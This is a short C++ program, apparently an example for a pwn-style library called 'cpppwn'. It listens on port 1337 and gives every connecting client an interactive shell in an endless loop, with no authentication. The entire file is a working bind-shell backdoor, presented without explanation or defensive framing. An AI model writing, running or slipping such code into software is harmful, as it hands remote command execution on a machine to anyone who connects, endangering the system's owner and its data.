#include <cpppwn.hpp>

//----------------------------------------
//
//----------------------------------------
int main() {
  using namespace cpppwn;
  
  Server server(1337);

  while(true) {
    auto client = server.accept();
    connect_shell(*client);    
  }
}
